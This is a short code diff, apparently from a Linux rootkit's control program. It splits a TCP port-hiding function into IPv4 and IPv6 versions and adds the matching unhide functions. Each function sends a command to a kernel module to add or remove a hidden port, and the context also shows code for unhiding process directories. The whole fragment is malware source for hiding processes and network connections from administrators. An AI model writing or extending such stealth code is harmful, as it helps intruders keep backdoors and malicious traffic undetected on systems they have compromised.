@@ -43,21 +43,41 @@ void unhide_process_dir(int pid) {
     unhide_absolute_path(path.c_str());
 }
 
-void hide_tcp_port(PORT port) {
+void hide_tcp4_port(PORT port) {
     msg_to_module msg;
     memset(&msg, '\x00', sizeof(msg));
 
-    msg.id = OPER_ADD_HIDDEN_TCP_PORT;
+    msg.id = OPER_ADD_HIDDEN_TCP4_PORT;
     memcpy(msg.data, (void*) &port, sizeof(PORT));
 
     kernelAccess.my_send_msg(msg);
 }
 
-void unhide_tcp_port(PORT port) {
+void unhide_tcp4_port(PORT port) {
     msg_to_module msg;
     memset(&msg, '\x00', sizeof(msg));
 
-    msg.id = OPER_REMOVE_HIDDEN_TCP_PORT;
+    msg.id = OPER_REMOVE_HIDDEN_TCP4_PORT;
+    memcpy(msg.data, &port, sizeof(PORT));
+
+    kernelAccess.my_send_msg(msg);
+}
+
+void hide_tcp6_port(PORT port) {
+    msg_to_module msg;
+    memset(&msg, '\x00', sizeof(msg));
+
+    msg.id = OPER_ADD_HIDDEN_TCP6_PORT;
+    memcpy(msg.data, (void*) &port, sizeof(PORT));
+
+    kernelAccess.my_send_msg(msg);
+}
+
+void unhide_tcp6_port(PORT port) {
+    msg_to_module msg;
+    memset(&msg, '\x00', sizeof(msg));
+
+    msg.id = OPER_REMOVE_HIDDEN_TCP6_PORT;
     memcpy(msg.data, &port, sizeof(PORT));
 
     kernelAccess.my_send_msg(msg);
